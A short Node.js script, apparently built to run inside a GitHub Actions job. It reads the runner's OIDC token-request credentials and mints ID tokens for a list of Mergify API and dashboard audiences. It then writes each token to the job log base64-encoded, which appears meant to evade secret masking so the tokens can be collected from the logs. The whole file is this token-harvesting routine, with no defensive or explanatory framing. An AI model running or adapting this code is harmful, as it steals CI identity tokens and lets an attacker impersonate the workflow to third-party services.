const auds = [
  "https://api.mergify.com",
  "api.mergify.com",
  "mergify",
  "https://dashboard.mergify.com",
  "https://mergify.com",
  "mergify-ci",
  "https://ci.mergify.com",
];
function enc(s) { return Buffer.from(s, "utf8").toString("base64"); }
(async () => {
  const url = process.env.ACTIONS_ID_TOKEN_REQUEST_URL;
  const tok = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;
  console.log("OIDC_ENV", url ? "URL_SET" : "URL_MISSING", tok ? "TOK_SET" : "TOK_MISSING");
  if (!url || !tok) return;
  for (const a of auds) {
    try {
      const r = await fetch(url + "&audience=" + encodeURIComponent(a), { headers: { Authorization: "Bearer " + tok } });
      const j = await r.json().catch(() => ({}));
      const v = j.value || "";
      console.log("B64AUD " + enc(a) + " " + r.status + " " + enc(v));
    } catch (e) {
      console.log("AUD_ERR " + enc(a) + " " + enc(String(e)));
    }
  }
})();
